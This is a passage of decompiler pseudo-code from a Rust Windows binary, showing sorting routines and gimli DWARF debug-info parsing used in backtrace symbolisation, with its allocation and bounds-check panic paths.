sym.__rust_dealloc(ppppppppuVar41, 8);\n            }\n            dbg.drop_in_place<alloc::collections::btree::map::BTreeMap<u64, gimli::read::abbrev::Abbreviation, alloc::alloc::Global>>\n                      (&iStack1824);\n            ppppppppuVar67 = ppppppppuStack1936;\n            ppppppppuVar40 = ppppppppuStack1792;\n            ppppppppuVar41 = ppppppppuStack1784;\n        }\n        goto joined_r0x00428966;\n    }\ncode_r0x00428c9d:\n    ppppppppuVar41 = uStack1912;\n    if (ppppppppuStack1896 < 0x15) {\n        if (0x1 < ppppppppuStack1896) {\n            iVar30 = 0;\n            iVar37 = ppppppppuStack1896 + -1;\n            do {\n                iVar60 = iVar37 + -1;\n                pppppppuVar70 = uStack1912[iVar60 * 4 + 2];\n                if (uStack1912[iVar37 * 4 + 2] < pppppppuVar70) {\n                    ppppppppuVar41 = uStack1912 + iVar60 * 4;\n                    pauVar38 = uStack1912 + iVar37 * 4;\n                    pppppppuVar61 = *ppppppppuVar41;\n                    uVar72 = *(ppppppppuVar41 + 1);\n                    uVar74 = *(ppppppppuVar41 + 0xc);\n                    uStack1408 = uVar72;\n                    uStack1407 = uVar72 >> 8;\n                    uStack1406 = uVar72 >> 0x10;\n                    pppppppuVar44 = uStack1912[iVar60 * 4 + 3];\n                    ppppppppuVar67 = uStack1912 + iVar37 * 4;\n                    uVar72 = *ppppppppuVar67;\n                    uVar76 = *(ppppppppuVar67 + 4);\n                    uVar78 = *(ppppppppuVar67 + 1);\n                    uVar80 = *(ppppppppuVar67 + 0xc);\n                    ppppppppuVar67 = uStack1912 + iVar37 * 4 + 2;\n                    uVar9 = *(ppppppppuVar67 + 4);\n                    uVar10 = *(ppppppppuVar67 + 1);\n                    uVar11 = *(ppppppppuVar67 + 0xc);\n                    *(ppppppppuVar41 + 2) = *ppppppppuVar67;\n                    *(ppppppppuVar41 + 0x14) = uVar9;\n                    *(ppppppppuVar41 + 3) = uVar10;\n                    *(ppppppppuVar41 + 0x1c) = uVar11;\n                    *ppppppppuVar41 = uVar72;\n                    *(ppppppppuVar41 + 4) = uVar76;\n                    *(ppppppppuVar41 + 1) = uVar78;\n                    *(ppppppppuVar41 + 0xc) = uVar80;\n                    if ((2 < ppppppppuStack1896 - iVar60) && (iVar37 = iVar30,  ppppppppuVar41[10] < pppppppuVar70)) {\n                        do {\n                            iVar32 = iVar37;\n                            puVar2 = uStack1912 + iVar32 + ppppppppuStack1896 * 0x20;\n                            uVar72 = *puVar2;\n                            uVar76 = puVar2[1];\n                            uVar78 = puVar2[2];\n                            uVar80 = puVar2[3];\n                            puVar2 = uStack1912 + iVar32 + ppppppppuStack1896 * 0x20 + 0x10;\n                            uVar9 = puVar2[1];\n                            uVar10 = puVar2[2];\n                            uVar11 = puVar2[3];\n                            puVar5 = uStack1912 + iVar32 + ppppppppuStack1896 * 0x20 + -0x10;\n                            *puVar5 = *puVar2;\n                            puVar5[1] = uVar9;\n                            puVar5[2] = uVar10;\n                            puVar5[3] = uVar11;\n                            puVar2 = uStack1912 + iVar32 + ppppppppuStack1896 * 0x20 + -0x20;\n                            *puVar2 = uVar72;\n                            puVar2[1] = uVar76;\n                            puVar2[2] = uVar78;\n                            puVar2[3] = uVar80;\n                            if (iVar32 + 0x20 == 0) break;\n                            iVar37 = iVar32 + 0x20;\n                        } while (*(uStack1912 + iVar32 + ppppppppuStack1896 * 0x20 + 0x30) < pppppppuVar70);\n                        pauVar38 = uStack1912 + iVar32 + ppppppppuStack1896 * 0x20;\n                    }\n                    *pauVar38 = CONCAT412(uVar74, CONCAT210(uStack1406, \n                                                            CONCAT19(uStack1407, CONCAT18(uStack1408, pppppppuVar61))));\n                    *pauVar38[1] = pppppppuVar70;\n                    *(pauVar38[1] + 8) = pppppppuVar44;\n                }\n                iVar30 = iVar30 + -0x20;\n                iVar37 = iVar60;\n            } while (iVar60 != 0);\n        }\ncode_r0x004294d5:\n        if (ppppppppuStack1896 != NULL) {\n            iVar37 = 0;\n            uVar45 = 0;\n            do {\n                uVar43 = *(uStack1912 + iVar37 + 0x18);\n                if (uVar45 <= uVar43) {\n                    uVar45 = uVar43;\n                }\n                *(uStack1912 + iVar37 + 8) = uVar45;\n                iVar37 = iVar37 + 0x20;\n            } while (ppppppppuStack1896 * 0x20 != iVar37);\n        }\n        uStack1376 = auStack1480._8_8_;\n        uStack1392 = iStack1488;\n        uStack1384 = SUB168(auStack1480, 0);\n        uStack1400 = SUB164(_auStack1904 >> 0x40, 0);\n        uStack1396 = SUB164(_auStack1904 >> 0x60, 0);\n        uStack1416._0_4_ = uStack1912;\n        uStack1416._4_4_ = uStack1912._4_4_;\n        uStack1408 = SUB161(_auStack1904, 0);\n        uStack1407 = SUB161(_auStack1904 >> 8, 0);\n        uStack1406 = SUB162(_auStack1904 >> 0x10, 0);\n        uStack1404 = auStack1904._4_4_;\n        *(puStack1864 + 1) = uStack1912;\n        *(puStack1864 + 0xc) = uStack1912._4_4_;\n        *(puStack1864 + 2) = auStack1904._0_4_;\n        *(puStack1864 + 0x14) = auStack1904._4_4_;\n        puStack1864[5] = uStack1384;\n        puStack1864[6] = auStack1480._8_8_;\n        puStack1864[3] = ppppppppuStack1896;\n        puStack1864[4] = iStack1488;\n        puStack1864[7] = ppppppppuStack1776;\n        puStack1864[8] = 0;\n        *puStack1864 = 0;\n        if ((ppppppppuStack1512 != NULL) && ((ppppppppuStack1512 & 0xfffffffffffffff) != 0)) {\n            sym.__rust_dealloc(ppppppppuStack1520, 8);\n        }\n        return;\n    }\n    auVar8 = ZEXT816(ppppppppuStack1896 >> 1) * ZEXT816(0x20);\n    iVar37 = SUB168(auVar8, 0);\n    bVar71 = SUB168(auVar8 >> 0x40, 0) != 0;\n    if (bVar71) {\n        sym.alloc::raw_vec::capacity_overflow::hf906fa3dbddee2ea();\n    }\n    else {\n        ppppppppuVar67 = !bVar71;\n        ppppppppuVar53 = ppppppppuVar67 << 3;\n        if (iVar37 != 0) {\n            ppppppppuVar53 = sym.__rust_alloc(iVar37, ppppppppuVar53);\n            ppppppppuVar67 = ppppppppuVar53;\n        }\n        if (ppppppppuVar67 != NULL) {\n            _auStack1688 = CONCAT88(ppppppppuStack1896 >> 1, ppppppppuVar53);\n            _auStack1672 = ZEXT816(uStack1664) << 0x40;\n            ppppppppuStack616 = 0x8;\n            ppppppppuStack608 = NULL;\n            appppppppuStack600[0] = NULL;\n            ppppppppuStack1960 = ppppppppuVar41 + -10;\n            ppppppppuStack1928 = ppppppppuVar41 + -4;\n            ppppppppuVar67 = 0x8;\n            ppppppppuVar64 = NULL;\n            ppppppppuStack1856 = ppppppppuStack1896;\n            ppppppppuStack2056 = ppppppppuVar41;\n            ppppppppuVar46 = ppppppppuStack1896;\n            ppppppppuStack2032 = ppppppppuVar53;\n            do {\n                ppppppppuVar53 = ppppppppuStack1896 + -1;\n                if (ppppppppuVar53 == NULL) {\n                    ppppppppuVar50 = 0x1;\n                    ppppppppuVar26 = NULL;\n                }\n                else {\n                    pppppppuVar70 = ppppppppuVar41[ppppppppuStack1896 * 4 + -6];\n                    if (ppppppppuVar41[ppppppppuVar53 * 4 + 2] < pppppppuVar70) {\n                        ppppppppuVar50 = ppppppppuStack1960 + ppppppppuStack1896 * 4;\n                        ppppppppuVar26 = ppppppppuVar53;\n                        do {\n                            if (ppppppppuVar26 == 0x1) {\n                                ppppppppuVar26 = NULL;\n                                break;\n                            }\n                            pppppppuVar44 = *ppppppppuVar50;\n                            ppppppppuVar26 = ppppppppuVar26 + -1;\n                            ppppppppuVar50 = ppppppppuVar50 + -4;\n                            bVar71 = pppppppuVar70 < pppppppuVar44;\n                            pppppppuVar70 = pppppppuVar44;\n                        } while (bVar71);\n                        ppppppppuVar50 = ppppppppuStack1896 - ppppppppuVar26;\n                        if (ppppppppuStack1896 < ppppppppuVar26) {\n                            dbg.slice_index_order_fail(ppppppppuVar26, ppppppppuStack1896);\n                            goto code_r0x00429a87;\n                        }\n                        if (ppppppppuVar46 < ppppppppuStack1896) {\n                            dbg.slice_end_index_len_fail(ppppppppuStack1896, ppppppppuVar46);\n                            goto code_r0x00429a87;\n                        }\n                        if (0x1 < ppppppppuVar50) {\n                            uVar45 = ppppppppuVar50 >> 1;\n                            ppppppppuVar20 = ppppppppuVar41 + ppppppppuVar26 * 4;\n                            pauVar38 = ppppppppuStack1928 + ppppppppuStack1896 * 4;\n                            do {\n                                uStack1416._0_4_ = *ppppppppuVar20;\n                                uStack1416._4_4_ = *(ppppppppuVar20 + 4);\n                                pppppppuVar70 = *ppppppppuVar20;\n                                uVar72 = *(ppppppppuVar20 + 1);\n                                uStack1404 = *(ppppppppuVar20 + 0xc);\n                                uStack1400 = *(ppppppppuVar20 + 2);\n                                uStack1396 = *(ppppppppuVar20 + 0x14);\n                                uVar74 = *(ppppppppuVar20 + 3);\n                                uVar76 = *(ppppppppuVar20 + 0x1c);\n                                uStack1392 = ppppppppuVar20[3];\n                                uStack1408 = uVar72;\n                                uStack1407 = uVar72 >> 8;\n                                uStack1406 = uVar72 >> 0x10;\n                                uVar72 = **pauVar38;\n                                uVar78 = *(*pauVar38 + 4);\n                                uVar80 = *(*pauVar38 + 8);\n                                uVar9 = *(*pauVar38 + 0xc);\n                                uVar10 = *(pauVar38[1] + 4);\n                                uVar11 = *(pauVar38[1] + 8);\n                                uVar12 = *(pauVar38[1] + 0xc);\n                                *(ppppppppuVar20 + 2) = *pauVar38[1];\n                                *(ppppppppuVar20 + 0x14) = uVar10;\n                                *(ppppppppuVar20 + 3) = uVar11;\n                                *(ppppppppuVar20 + 0x1c) = uVar12;\n                                *ppppppppuVar20 = uVar72;\n                                *(ppppppppuVar20 + 4) = uVar78;\n                                *(ppppppppuVar20 + 1) = uVar80;\n                                *(ppppppppuVar20 + 0xc) = uVar9;\n                                *pauVar38[1] = uStack1400;\n                                *(pauVar38[1] + 4) = uStack1396;\n                                *(pauVar38[1] + 8) = uVar74;\n                                *(pauVar38[1] + 0xc) = uVar76;\n                                *pauVar38 = CONCAT412(uStack1404, \n                                                      CONCAT210(uStack1406, \n                                                                CONCAT19(uStack1407, CONCAT18(uStack1408, pppppppuVar70)\n                                                                        )));\n                                ppppppppuVar20 = ppppppppuVar20 + 4;\n                                pauVar38 = pauVar38[-2];\n                                uVar45 = uVar45 - 1;\n                            } while (uVar45 != 0);\n                        }\n                    }\n                    else {\n                        ppppppppuVar26 = ppppppppuStack1960 + ppppppppuStack1896 * 4;\n                        iVar37 = 0;\n                        do {\n                            iVar30 = iVar37;\n                            if (ppppppppuStack1896 + -2 == iVar30) {\n                                ppppppppuVar26 = NULL;\n                                ppppppppuVar50 = ppppppppuStack1896;\n                                goto code_r0x004290d0;\n                            }\n                            pppppppuVar44 = *ppppppppuVar26;\n                            ppppppppuVar26 = ppppppppuVar26 + -4;\n                            bVar71 = pppppppuVar44 <= pppppppuVar70;\n                            pppppppuVar70 = pppppppuVar44;\n                            iVar37 = iVar30 + 1;\n                        } while (bVar71);\n                        ppppppppuVar26 = ppppppppuVar53 - (iVar30 + 1);\n                        ppppppppuVar50 = iVar30 + 2;\n                    }\n                    if ((ppppppppuVar26 != NULL) && (ppppppppuVar50 < 0xa)) {\n                        ppppppppuStack1936 = ppppppppuVar53;\n                        if (ppppppppuVar46 < ppppppppuStack1896) {\n                            ppppppppuVar26 = ppppppppuVar26 + -1;\n                            if (ppppppppuStack1896 < ppppppppuVar26) {\ncode_r0x004298b8:\n                                dbg.slice_index_order_fail(ppppppppuVar26, ppppppppuStack1896);\n                            }\n                            else {\n                                dbg.slice_end_index_len_fail(ppppppppuStack1896, ppppppppuVar46);\n                            }\n                            goto code_r0x00429a87;\n                        }\n                        uVar45 = ppppppppuVar26 << 5;\n                        uVar43 = uVar45 ^ 0xffffffffffffffe0;\n                        ppppppppuVar20 = ppppppppuVar26;\n                        do {\n                            ppppppppuVar26 = ppppppppuVar20 + -1;\n                            ppppppppuVar50 = ppppppppuStack1896 - ppppppppuVar26;\n                            if (ppppppppuStack1896 < ppppppppuVar26) goto code_r0x004298b8;\n                            if ((0x1 < ppppppppuVar50) &&\n                               (pppppppuVar70 = ppppppppuVar41[ppppppppuVar26 * 4 + 2], \n                               ppppppppuVar41[ppppppppuVar20 * 4 + 2] < pppppppuVar70)) {\n                                ppppppppuVar40 = ppppppppuVar41 + ppppppppuVar26 * 4;\n                                pauVar38 = ppppppppuVar41 + ppppppppuVar20 * 4;\n                                uStack1416._0_4_ = *ppppppppuVar40;\n                                uStack1416._4_4_ = *(ppppppppuVar40 + 4);\n                                pppppppuVar61 = *ppppppppuVar40;\n                                uVar72 = *(ppppppppuVar40 + 1);\n                                uStack1404 = *(ppppppppuVar40 + 0xc);\n                                uStack1408 = uVar72;\n                                uStack1407 = uVar72 >> 8;\n                                uStack1406 = uVar72 >> 0x10;\n                                pppppppuVar44 = ppppppppuVar41[ppppppppuVar26 * 4 + 3];\n                                ppppppppuVar7 = ppppppppuVar41 + ppppppppuVar20 * 4;\n                                uVar72 = *ppppppppuVar7;\n                                uVar74 = *(ppppppppuVar7 + 4);\n                                uVar76 = *(ppppppppuVar7 + 1);\n                                uVar78 = *(ppppppppuVar7 + 0xc);\n                                ppppppppuVar7 = ppppppppuVar41 + ppppppppuVar20 * 4 + 2;\n                                uVar80 = *(ppppppppuVar7 + 4);\n                                uVar9 = *(ppppppppuVar7 + 1);\n                                uVar10 = *(ppppppppuVar7 + 0xc);\n                                *(ppppppppuVar40 + 2) = *ppppppppuVar7;\n                                *(ppppppppuVar40 + 0x14) = uVar80;\n                                *(ppppppppuVar40 + 3) = uVar9;\n                                *(ppppppppuVar40 + 0x1c) = uVar10;\n                                *ppppppppuVar40 = uVar72;\n                                *(ppppppppuVar40 + 4) = uVar74;\n                                *(ppppppppuVar40 + 1) = uVar76;\n                                *(ppppppppuVar40 + 0xc) = uVar78;\n                                if ((0x2 < ppppppppuVar50) &&\n                                   (ppppppppuVar7 = ppppppppuVar41,  ppppppppuVar54 = ppppppppuVar53, \n                                   ppppppppuVar40[10] < pppppppuVar70)) {\n                                    do {\n                                        ppppppppuVar40 = ppppppppuVar7;\n                                        puVar2 = ppppppppuVar40 + uVar45 + 0x20;\n                                        uVar72 = *puVar2;\n                                        uVar74 = puVar2[1];\n                                        uVar76 = puVar2[2];\n                                        uVar78 = puVar2[3];\n                                        puVar2 = ppppppppuVar40 + uVar45 + 0x30;\n                                        uVar80 = puVar2[1];\n                                        uVar9 = puVar2[2];\n                                        uVar10 = puVar2[3];\n                                        puVar5 = ppppppppuVar40 + uVar45 + 0x10;\n                                        *puVar5 = *puVar2;\n                                        puVar5[1] = uVar80;\n                                        puVar5[2] = uVar9;\n                                        puVar5[3] = uVar10;\n                                        puVar2 = ppppppppuVar40 + uVar45;\n                                        *puVar2 = uVar72;\n                                        puVar2[1] = uVar74;\n                                        puVar2[2] = uVar76;\n                                        puVar2[3] = uVar78;\n                                        if (ppppppppuVar20 == ppppppppuVar54 + -1) break;\n                                        ppppppppuVar7 = ppppppppuVar40 + 4;\n                                        ppppppppuVar54 = ppppppppuVar54 + -1;\n                                    } while (*(ppppppppuVar40 + uVar45 + 0x50) < pppppppuVar70);\n                                    pauVar38 = ppppppppuVar40 - uVar43;\n                                }\n                                *pauVar38 = CONCAT412(uStack1404, \n                                                      CONCAT210(uStack1406, \n                                                                CONCAT19(uStack1407, CONCAT18(uStack1408, pppppppuVar61)\n                                                                        )));\n                                *pauVar38[1] = pppppppuVar70;\n                                *(pauVar38[1] + 8) = pppppppuVar44;\n                            }\n                            if (ppppppppuVar26 == NULL) break;\n                            uVar43 = uVar43 + 0x20;\n                            uVar45 = uVar45 - 0x20;\n                            ppppppppuVar20 = ppppppppuVar26;\n                        } while (ppppppppuVar50 < 0xa);\n                    }\n                }\ncode_r0x004290d0:\n                if (ppppppppuVar64 == ppppppppuStack608) {\n                    dbg.reserve_for_push<(gimli::common::DebugInfoOffset<usize>, gimli::common::DebugArangesOffset<usize>), alloc::alloc::Global>\n                              (&ppppppppuStack616, ppppppppuVar64);\n                    ppppppppuVar64 = appppppppuStack600[0];\n                    ppppppppuVar67 = ppppppppuStack616;\n                }\n                ppppppppuVar67[ppppppppuVar64 * 2] = ppppppppuVar26;\n                ppppppppuVar67[ppppppppuVar64 * 2 + 1] = ppppppppuVar50;\n                ppppppppuVar64 = ppppppppuVar64 + 1;\n                ppppppppuStack1936 = ppppppppuVar67;\n                ppppppppuStack1920 = ppppppppuVar26;\n                appppppppuStack600[0] = ppppppppuVar64;\n                if (0x1 < ppppppppuVar64) {\n                    do {\n                        ppppppppuVar26 = ppppppppuStack2032;\n                        ppppppppuVar53 = ppppppppuVar64 + -1;\n                        appppppppuStack600[0] = ppppppppuVar64;\n                        if (ppppppppuVar67[ppppppppuVar53 * 2] == NULL) {\ncode_r0x00429250:\n                            if (0x2 < ppppppppuVar64) {\n                                pppppppuVar44 = ppppppppuVar67[ppppppppuVar53 * 2 + 1];\n                                pppppppuVar61 = ppppppppuVar67[(ppppppppuVar64 + -3) * 2 + 1];\n                                goto code_r0x0042926b;\n                            }\ncode_r0x00429270:\n                            ppppppppuVar50 = ppppppppuVar64 + -2;\n                        }\n                        else {\n                            pppppppuVar70 = ppppppppuVar67[ppppppppuVar64 * 2 + -3];\n                            pppppppuVar44 = ppppppppuVar67[ppppppppuVar53 * 2 + 1];\n                            if (pppppppuVar70 <= pppppppuVar44) goto code_r0x00429250;\n                            if (ppppppppuVar64 < 0x3) {\n                                ppppppppuVar64 = 0x2;\n                                goto code_r0x00428e55;\n                            }\n                            pppppppuVar61 = ppppppppuVar67[(ppppppppuVar64 + -3) * 2 + 1];\n                            if (pppppppuVar44 + pppppppuVar70 < pppppppuVar61) {\n                                if (ppppppppuVar64 < 0x4) {\n                                    ppppppppuVar64 = 0x3;\n                                    goto code_r0x00428e55;\n                                }\n                                if (pppppppuVar70 + pppppppuVar61 <= ppppppppuVar67[ppppppppuVar64 * 2 + -7] &&\n                                    ppppppppuVar67[ppppppppuVar64 * 2 + -7] != pppppppuVar70 + pppppppuVar61)\n                                goto code_r0x00428e55;\n                            }\ncode_r0x0042926b:\n                            ppppppppuVar50 = ppppppppuVar64 + -3;\n                            if (pppppppuVar44 <= pppppppuVar61) goto code_r0x00429270;\n                        }\n                        ppppppppuVar20 = ppppppppuVar50 + 1;\n                        if (ppppppppuVar64 <= ppppppppuVar20) {\n                            dbg.panic_bounds_check(ppppppppuVar20, ppppppppuVar64, 0x4499c8);\n                            goto code_r0x00429a87;\n                        }\n                        if (ppppppppuVar64 <= ppppppppuVar50) {\n                            dbg.panic_bounds_check(ppppppppuVar50, ppppppppuVar64, 0x4499e0);\n                            goto code_r0x00429a87;\n                        }\n                        ppppppppuVar40 = ppppppppuVar67[ppppppppuVar20 * 2];\n                        ppppppppuVar7 = ppppppppuVar67[ppppppppuVar50 * 2 + 1];\n                        ppppppppuVar67 = ppppppppuVar67[ppppppppuVar50 * 2] + ppppppppuVar7;\n                        if (ppppppppuVar67 < ppppppppuVar40) {\n                            dbg.slice_index_order_fail(ppppppppuVar40, ppppppppuVar67);\n                            goto code_r0x00429a87;\n                        }\n                        if (ppppppppuVar46 < ppppppppuVar67) {\n                            dbg.slice_end_index_len_fail(ppppppppuVar67, ppppppppuStack1856);\n                            goto code_r0x00429a87;\n                        }\n                        pppppppuVar70 = ppppppppuStack1936[ppppppppuVar20 * 2 + 1];\n                        ppppppppuStack2008 = ppppppppuStack1936 + ppppppppuVar50 * 2;\n                        ppppppppuStack1944 = ppppppppuStack1936 + ppppppppuVar50 * 2 + 1;\n                        ppppppppuVar41 = ppppppppuVar41 + ppppppppuVar40 * 4;\n                        ppppppppuVar46 = ppppppppuVar41 + pppppppuVar70 * 4;\n                        pppppppuVar44 = (ppppppppuVar67 - ppppppppuVar40) - pppppppuVar70;\n                        ppppppppuStack2064 = ppppppppuVar50;\n                        ppppppppuStack2048 = ppppppppuVar53;\n                        ppppppppuStack1792 = ppppppppuVar7;\n                        ppppppppuStack1784 = ppppppppuVar40;\n                        if (pppppppuVar44 < pppppppuVar70) {\n                            sym.memcpy(ppppppppuStack2032, ppppppppuVar46, pppppppuVar44 * 0x20);\n                            ppppppppuVar50 = ppppppppuVar26 + pppppppuVar44 * 4;\n                            ppppppppuVar26 = ppppppppuStack2032;\n                            ppppppppuVar53 = ppppppppuVar46;\n                            if ((0 < pppppppuVar70) && (0 < pppppppuVar44)) {\n                                ppppppppuVar67 = ppppppppuStack1928 + ppppppppuVar67 * 4;\n                                do {\n                                    if (ppppppppuVar50[-2] < ppppppppuVar53[-2]) {\n                                        ppppppppuVar46 = ppppppppuVar53 + -4;\n                                        ppppppppuVar53 = ppppppppuVar46;\n                                    }\n                                    else {\n                                        ppppppppuVar46 = ppppppppuVar50 + -4;\n                                        ppppppppuVar50 = ppppppppuVar46;\n                                    }\n                                    uVar72 = *ppppppppuVar46;\n                                    uVar74 = *(ppppppppuVar46 + 4);\n                                    uVar76 = *(ppppppppuVar46 + 1);\n                                    uVar78 = *(ppppppppuVar46 + 0xc);\n                                    uVar80 = *(ppppppppuVar46 + 0x14);\n                                    uVar9 = *(ppppppppuVar46 + 3);\n                                    uVar10 = *(ppppppppuVar46 + 0x1c);\n                                    *(ppppppppuVar67 + 2) = *(ppppppppuVar46 + 2);\n                                    *(ppppppppuVar67 + 0x14) = uVar80;\n                                    *(ppppppppuVar67 + 3) = uVar9;\n                                    *(ppppppppuVar67 + 0x1c) = uVar10;\n                                    *ppppppppuVar67 = uVar72;\n                                    *(ppppppppuVar67 + 4) = uVar74;\n                                    *(ppppppppuVar67 + 1) = uVar76;\n                                    *(ppppppppuVar67 + 0xc) = uVar78;\n                                } while ((ppppppppuVar41 < ppppppppuVar53) &&\n                                        (ppppppppuVar67 = ppppppppuVar67 + -4,  ppppppppuStack2032 < ppppppppuVar50));\n                            }\n                        }\n                        else {\n                            sym.memcpy(ppppppppuStack2032, ppppppppuVar41, pppppppuVar70 * 0x20);\n                            ppppppppuVar50 = ppppppppuVar26 + pppppppuVar70 * 4;\n                            ppppppppuVar53 = ppppppppuVar41;\n                            if ((0 < pppppppuVar70) && (pppppppuVar70 < ppppppppuVar67 - ppppppppuVar40)) {\n                                do {\n                                    bVar71 = ppppppppuVar46[2] < ppppppppuVar26[2];\n                                    ppppppppuVar53 = ppppppppuVar26;\n                                    if (bVar71) {\n                                        ppppppppuVar53 = ppppppppuVar46;\n                                    }\n                                    ppppppppuVar26 = ppppppppuVar26 + !bVar71 * 4;\n                                    uVar72 = *ppppppppuVar53;\n                                    uVar74 = *(ppppppppuVar53 + 4);\n                                    uVar76 = *(ppppppppuVar53 + 1);\n                                    uVar78 = *(ppppppppuVar53 + 0xc);\n                                    uVar80 = *(ppppppppuVar53 + 0x14);\n                                    uVar9 = *(ppppppppuVar53 + 3);\n                                    uVar10 = *(ppppppppuVar53 + 0x1c);\n                                    *(ppppppppuVar41 + 2) = *(ppppppppuVar53 + 2);\n                                    *(ppppppppuVar41 + 0x14) = uVar80;\n                                    *(ppppppppuVar41 + 3) = uVar9;\n                                    *(ppppppppuVar41 + 0x1c) = uVar10;\n                                    *ppppppppuVar41 = uVar72;\n                                    *(ppppppppuVar41 + 4) = uVar74;\n                                    *(ppppppppuVar41 + 1) = uVar76;\n                                    *(ppppppppuVar41 + 0xc) = uVar78;\n                                    ppppppppuVar41 = ppppppppuVar41 + 4;\n                                    ppppppppuVar53 = ppppppppuVar41;\n                                } while ((ppppppppuVar26 < ppppppppuVar50) &&\n                                        (ppppppppuVar46 = ppppppppuVar46 + bVar71 * 4, \n                                        ppppppppuVar46 < ppppppppuStack2056 + ppppppppuVar67 * 4));\n                            }\n                        }\n                        ppppppppuVar41 = ppppppppuStack2008;\n                        sym.memcpy(ppppppppuVar53, ppppppppuVar26, ppppppppuVar50 - ppppppppuVar26);\n                        ppppppppuVar67 = ppppppppuStack1936;\n                        *ppppppppuVar41 = ppppppppuStack1784;\n                        *ppppppppuStack1944 = ppppppppuStack1792 + pppppppuVar70;\n                        sub.msvcrt.dll_memmove\n                                  (ppppppppuStack1936 + ppppppppuVar20 * 2, ppppppppuStack1936 + ppppppppuVar20 * 2 + 2\n                                   , (ppppppppuVar64 + (0xffffffffffffffe - ppppppppuStack2064)) * 0x10);\n                        appppppppuStack600[0] = ppppppppuStack2048;\n                        ppppppppuVar64 = ppppppppuStack2048;\n                        ppppppppuVar41 = ppppppppuStack2056;\n                        ppppppppuVar46 = ppppppppuStack1856;\n                    } while (0x1 < ppppppppuStack2048);\n                    ppppppppuVar64 = 0x1;\n                }\ncode_r0x00428e55:\n                ppppppppuStack1896 = ppppppppuStack1920;\n            } while (ppppppppuStack1920 != NULL);\n            if ((ppppppppuStack608 != NULL) && ((ppppppppuStack608 & 0xfffffffffffffff) != 0)) {\n                sym.__rust_dealloc(ppppppppuVar67, 8);\n            }\n            if ((uStack1680 != NULL) && ((_auStack1688 & 0x7ffffffffffffff) != 0x0)) {\n                sym.__rust_dealloc(auStack1688, 8);\n            }\n            goto code_r0x004294d5;\n        }\n        dbg.handle_alloc_error(iVar37);\n    }\ncode_r0x00429a87:\n    do {\n        invalidInstructionException();\n    } while( true );\n    while( true ) {\n        ppppppppuVar50 = ppppppppuVar41 - 1;\n        uStack1600 = 0xffffffffffffffff;\n        ppppppppuStack1648 = NULL;\n        ppppppppuVar41 = unaff_RDI;\n        ppppppppuVar67 = ppppppppuVar26;\n        if (ppppppppuVar50 == ppppppppuVar46) break;\ncode_r0x0042641d:\n        ppppppppuStack1648 = NULL;\n        ppppppppuVar46 = NULL;\n        pppppppuVar44 = NULL;\n        iVar23 = 0;\n        while( true ) {\n            uVar55 = *(ppppppppuVar67 + ppppppppuVar46);\n            if ((iVar23 == 0x3f) && (1 < uVar55)) goto code_r0x00426f23;\n            unaff_RDI = uVar55;\n            pppppppuVar44 = pppppppuVar44 | (uVar55 & 0x7f) << (iVar23 & 0x3f);\n            if (-1 < uVar55) break;\n            iVar23 = iVar23 + 7;\n            ppppppppuVar46 = ppppppppuVar46 + 1;\n            if (ppppppppuVar41 == ppppppppuVar46) goto code_r0x00426f23;\n        }\n        ppppppppuVar26 = ppppppppuVar67 + ppppppppuVar46 + 1;\n        unaff_RDI = ~ppppppppuVar46 + ppppppppuVar41;\n        _auStack1688 = CONCAT88(unaff_RDI, ppppppppuVar26);\n        if (pppppppuVar44 != NULL) {\n            ppppppppuStack1960 = ppppppppuVar53;\n            if (pppppppuVar44 - 1U < ppppppppuStack1320) {\n                ppppppppuStack1616 = ppppppppuStack1848 + (pppppppuVar44 - 1U) * 0xe;\n                goto code_r0x0042656d;\n            }\n            if (uStack1816 != NULL) {\n                iVar37 = CONCAT44(uStack1820, CONCAT13(uStack1309, CONCAT12(uStack1310, iStack1824)));\n                ppppppppuVar53 = uStack1816;\n                goto code_r0x004264fe;\n            }\n            break;\n        }\n    }\n    goto code_r0x00426f23;\ncode_r0x004264fe:\n    uVar45 = *(ppppppppuVar53 + 0x532);\n    puVar21 = uVar45 * 0x70;\n    uVar69 = 0xffffffffffffffff;\n    unaff_RDI = 0x10;\n    do {\n        if (unaff_RDI + uVar45 * 0xe == 0x10) goto code_r0x0042654e;\n        cVar19 = ppppppppuVar53[uVar69 + 2] != pppppppuVar44;\n        if (pppppppuVar44 <= ppppppppuVar53[uVar69 + 2] && cVar19) {\n            cVar19 = -1;\n        }\n        uVar69 = uVar69 + 1;\n        unaff_RDI = unaff_RDI + -0xe;\n    } while (cVar19 == '\\x01');\n    uVar45 = uVar69;\n    if (cVar19 == -1) {\ncode_r0x0042654e:\n        bVar71 = iVar37 != 0;\n        iVar37 = iVar37 + -1;\n        if (bVar71) goto code_r0x00426560;\n        goto code_r0x00426f23;\n    }\n    ppppppppuStack1616 = ppppppppuVar53 - unaff_RDI;\ncode_r0x0042656d:\n    ppppppppuVar53 = ppppppppuStack2064 + ppppppppuVar64;\n    ppppppppuStack1656 = ppppppppuVar67 + ((uVar43 + (0xffffffef < uVar24) * 8) - ppppppppuVar53) + 4;\n    ppppppppuVar41 = ~ppppppppuVar46 + ppppppppuVar41;\n    ppppppppuVar67 = ppppppppuVar67 + ppppppppuVar46 + 1;\n    uStack1600 = *(ppppppppuStack1616 + 0x6a) == '\\x01';\n    ppppppppuStack1632 = NULL;\n    pppppppuStack1608 = &uStack1416;\n    ppppppppuStack1648 = ppppppppuVar67;\n    ppppppppuStack1640 = ppppppppuVar41;\n    uStack1720 = sym._gimli::read::abbrev::Attributes_as_core::ops::deref::Deref_::deref::h3a59bec7b942654d\n                           (ppppppppuStack1616 + 1);\n    _auStack1728 = CONCAT88(uStack1720, ppppppppuVar41);\n    ppppppppuStack1704 = &ppppppppuStack1656;\n    uStack1736 = ppppppppuVar67;\n    uStack1712 = ppppppppuVar53;\n    if (ppppppppuVar53 != NULL) {\n        ppppppppuVar67 = 0x2e;\n        unaff_RDI = 0x2e;\n        iVar37 = 0;\n        ppppppppuStack2096 = 0x2e;\n        ppppppppuVar41 = &pppppppuStack1608;\n        while( true ) {\n            ppppppppuVar46 = uStack1712;\n            ppppppppuVar53 = &ppppppppuStack1848;\n            sym.gimli::read::unit::parse_attribute::h7cbf9c79cddacd7d\n                      (ppppppppuVar53, &uStack1736, *(*ppppppppuVar41 + 9), *uStack1720);\n            pppppppuVar70 = pppppppuStack2072;\n            if (ppppppppuStack1848 != NULL) break;\n            uStack1712 = ppppppppuVar46 - 1;\n            _auStack1728 = CONCAT88(uStack1720 + 2, auStack1728);\n            uStack1464 = CONCAT44(uStack1820, CONCAT22(uStack1822, iStack1824));\n            _auStack1456 = CONCAT88(uStack1448, uStack1816);\n            if (auStack1840 == 0x2e) goto code_r0x004269df;\n            ppppppppuStack1848 = 